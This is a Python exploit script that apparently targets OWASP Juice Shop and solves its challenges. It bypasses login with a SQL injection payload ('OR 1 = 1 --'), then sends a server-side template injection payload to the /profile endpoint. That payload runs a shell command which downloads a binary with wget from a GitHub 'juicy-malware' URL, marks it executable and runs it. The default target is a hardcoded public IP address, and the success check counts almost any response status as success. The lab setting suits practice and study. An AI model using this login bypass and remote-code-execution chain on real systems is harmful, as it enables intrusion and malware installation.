import requests
import logging
from typing import Dict, Optional, Any
from urllib.parse import urljoin
import sys

requests.packages.urllib3.disable_warnings()

class CustomLogger:
    def __init__(self, name: str, level: int = logging.INFO):
        self.logger = logging.getLogger(name)
        self.logger.setLevel(level)
        
        handler = logging.StreamHandler(sys.stdout)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)

class ChallengeManager:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.challenges_endpoint = "/rest/challenges"
        self.logger = CustomLogger("ChallengeManager").logger

    def get_challenges(self) -> Dict[str, Any]:
        url = urljoin(self.base_url, self.challenges_endpoint)
        try:
            response = requests.get(url, timeout=10, verify=False)
            response.raise_for_status()
            
            challenges = response.json().get("data", [])
            solved_challenges = [
                {"name": c["name"], "description": c["description"]}
                for c in challenges if c.get("solved", False)
            ]
            self.logger.info(f"Retrieved {len(solved_challenges)} solved challenges")
            return {"status": "success", "solved_challenges": solved_challenges}
            
        except requests.exceptions.Timeout:
            self.logger.error("Request timed out while fetching challenges")
            return {"status": "failed", "details": "Request timed out"}
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Failed to fetch challenges: {str(e)}")
            return {"status": "failed", "details": str(e)}
        except ValueError as e:
            self.logger.error(f"Invalid JSON response: {str(e)}")
            return {"status": "failed", "details": "Invalid response format"}

class SSTITester:
    def __init__(self, base_url: str):
        if not base_url:
            raise ValueError("Base URL cannot be empty")
            
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        self.challenge_manager = ChallengeManager(base_url)
        self.logger = CustomLogger("SSTITester").logger

    def login_as_admin(self, email: str = "' OR 1 = 1 --", password: str = "whatever") -> bool:
        """Authenticate as admin user"""
        self.headers['Content-Type'] = 'application/json'
        payload = {"email": email, "password": password}
        
        try:
            response = self.session.post(
                urljoin(self.base_url, "/rest/user/login"),
                json=payload,
                headers=self.headers,
                timeout=10,
                verify=False
            )
            response.raise_for_status()
            
            auth_data = response.json()
            if "authentication" in auth_data and auth_data["authentication"].get("token"):
                token = auth_data["authentication"]["token"]
                self.headers["Authorization"] = f"Bearer {token}"
                self.logger.info("Successfully authenticated")
                return True
                
            self.logger.error("Authentication failed - invalid response format")
            return False
            
        except requests.exceptions.Timeout:
            self.logger.error("Login request timed out")
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Login failed: {str(e)}")
        except ValueError as e:
            self.logger.error(f"Invalid login response: {str(e)}")
        return False

    def check_ssti_challenge(self) -> bool:
        """Check if SSTI challenge is solved"""
        result = self.challenge_manager.get_challenges()
        if result["status"] == "success":
            for challenge in result["solved_challenges"]:
                if "ssti" in challenge["name"].lower():
                    self.logger.info(f"SSTI Challenge solved: {challenge['name']}")
                    return True
        return False

    def test_ssti(self, payload: str, test_type: str = "SSTI Test") -> bool:
        """Test SSTI vulnerability with given payload"""
        if not payload:
            self.logger.error("Empty payload provided")
            return False
            
        if "Authorization" not in self.headers:
            self.logger.error("Not authenticated. Please login first")
            return False

        self.logger.info(f"Sending {test_type} payload")
        try:
            self.headers['Content-Type'] = 'application/x-www-form-urlencoded'
            response = self.session.post(
                urljoin(self.base_url, "/profile"),
                data=f"username={payload}",
                headers=self.headers,
                verify=False,
                timeout=10,
                allow_redirects=True
            )
            self.logger.info(f"Status: {response.status_code}")
            self.logger.info(f"Response Headers: {dict(response.headers)}")
            self.logger.info(f"Response Content: {response.text}")
            
            if self.check_ssti_challenge() or response.status_code in (200, 201, 302, 303, 307, 500):
                self.logger.info("SSTI Challenge completed successfully!")
                return True
                
            return False
            
        except requests.exceptions.Timeout:
            self.logger.error(f"{test_type} request timed out")
        except requests.exceptions.RequestException as e:
            self.logger.error(f"{test_type} failed: {str(e)}")
        except Exception as e:
            self.logger.error(f"Unexpected error during {test_type}: {str(e)}")
        return False

    def run(self) -> None:
        """Run complete SSTI test sequence"""
        try:
            if not self.login_as_admin():
                return

            test_payload = "#{1+1}"
            rce_payload = """#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_amd_64?raw=true && chmod +x malware && ./malware')}"""

            if self.test_ssti(test_payload, "SSTI Test"):
                if self.test_ssti(rce_payload, "RCE"):
                    self.logger.info("SSTI RCE payload successfully executed")
                else:
                    self.logger.error("RCE payload failed")
            else:
                self.logger.error("Initial SSTI test failed")
                
        except Exception as e:
            self.logger.error(f"Critical error during test sequence: {str(e)}")

def main():
    try:
        logging.basicConfig(level=logging.INFO)
        if len(sys.argv) > 1:
            base_url = sys.argv[1]
        else:
            base_url = "http://45.76.47.218:3000"
            
        tester = SSTITester(base_url)
        tester.run()
        
    except Exception as e:
        logging.error(f"Fatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()